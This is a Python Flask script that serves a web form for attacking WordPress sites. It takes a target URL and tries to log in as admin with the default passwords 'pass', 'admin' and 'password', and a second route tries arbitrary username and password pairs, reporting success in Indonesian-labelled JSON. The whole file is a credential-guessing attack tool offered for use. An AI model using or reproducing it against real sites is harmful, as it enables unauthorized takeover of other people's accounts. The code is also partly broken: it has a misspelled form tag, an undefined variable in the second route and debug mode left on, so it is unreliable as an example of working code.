import login as wp
from flask import *
import os
app=Flask('__name__')
@app.route('/', methods=['GET','POST'])
def index():
	return '<head><title>TESTING BRUTEFORCE WORDPRESS</title></head><body><form action=\'/crack\' method=\'POST\'><input type=\'text\' name=\'url\'><imput type=\'submit\'></form></body>'
@app.route('/crack',methods=['GET','POST'])
def auto_wp():
	try:
		j=request.form.get('url')
		if wp.__start__(j,'admin','pass') == True:
			return '{\'status\':\'sukses\',\'username\':\'%s\',\'password\':\'%s\',\'result\':\'%s\'}'%('admin','pass',j)
		elif wp.__start__(j,'admin','admin') == True:
			return '{\'status\':\'sukses\',\'username\':\'%s\',\'password\':\'%s\',\'result\':\'%s\'}'%('admin','admin',j)
		elif wp.__start__(j,'admin','password') == True:
			return '{\'status\':\'sukses\',\'username\':\'%s\',\'password\':\'%s\',\'result\':\'%s\'}'%('admin','password',j)
		else:
			return '{\'status\':\'gagal\',\'result\':\'%s\'}'%(j)
	except:
		return '{\'status\':\'fatal\',\'pesan\':\'tidak ada data yg di eksekusi\'}'
@app.route('/force.php',methods=['GET','POST'])
def login():
	try:
		username=request.form.get('username')
		password=request.form.get('password')
		url     =request.form.get('url')
		if wp.__start__(j,username,password) == True :
			return '{\'status\':\'sukses\',\'username\':\'%s\',\'password\':\'%s\',\'result\':\'%s\'}'%(username,password,j)
		else:
			return '{\'status\':\'gagal\',\'username\':\'%s\',\'password\':\'%s\',\'result\':\'%s\'}'%(username,password,j)
	except:
		return '{\'status\':\'gagal\',\'pesan\':\'tidak ada data yg di eksekusi\'}'
if __name__ == '__main__':
	app.run(host='0.0.0.0',port=int(os.environ.get('PORT','5000')),debug=True)
